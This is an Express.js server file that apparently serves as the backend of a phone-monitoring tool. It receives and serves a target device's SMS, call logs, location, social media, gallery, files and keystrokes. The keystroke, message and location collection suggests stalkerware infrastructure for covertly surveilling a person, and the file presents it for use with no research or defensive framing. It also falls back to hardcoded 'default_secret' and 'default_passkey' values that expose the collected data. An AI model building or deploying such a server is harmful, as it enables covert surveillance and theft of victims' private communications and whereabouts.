const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const session = require('express-session');
const FileStore = require('session-file-store')(session); // File-based session storage
require('dotenv').config(); // Load environment variables

const app = express();

// Middleware setup
app.use(cors({
    origin: 'https://iosx.vercel.app', // Your front-end URL
    credentials: true // Allow credentials to be sent
}));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Session configuration with FileStore
app.use(session({
    store: new FileStore({ path: './sessions' }), // Specify the directory for session files
    secret: process.env.SESSION_SECRET || 'default_secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));

// Your activity tracking data and routes
const correctPasskey = process.env.PASSKEY || "default_passkey";
let activityData = {
    Notifications: '',
    SMS: '',
    CallLogs: '',
    Location: '',
    SocialMedia: '',
    GalleryAccess: '',
    FileManager: '',
    Keystrokes: ''
};

// Login endpoint
app.post('/login', (req, res) => {
    const { passkey } = req.body;
    if (passkey === correctPasskey) {
        req.session.authenticated = true;
        res.status(200).json({ message: "Login successful" });
    } else {
        res.status(401).json({ message: "Incorrect passkey" });
    }
});

// Middleware to check if user is authenticated
function isAuthenticated(req, res, next) {
    if (req.session.authenticated) {
        next();
    } else {
        res.status(401).json({ message: "Unauthorized" });
    }
}

// Endpoint to receive monitoring data
app.post('/monitor', isAuthenticated, (req, res) => {
    const { activityType, data } = req.body;
    if (activityType && activityData[activityType] !== undefined) {
        activityData[activityType] = data;
        res.sendStatus(200);
    } else {
        res.status(400).json({ message: "Invalid activity type" });
    }
});

// Endpoint to fetch activity data for authenticated clients
app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
    const { activityType } = req.params;
    if (activityData[activityType] !== undefined) {
        res.json({ data: activityData[activityType] || "No data available" });
    } else {
        res.status(400).json({ message: "Invalid activity type" });
    }
});

// Endpoint to check authentication status
app.get('/auth-status', (req, res) => {
    res.status(200).json({ authenticated: !!req.session.authenticated });
});

// Logout endpoint
app.post('/logout', (req, res) => {
    req.session.destroy(() => {
        res.status(200).json({ message: "Logged out" });
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
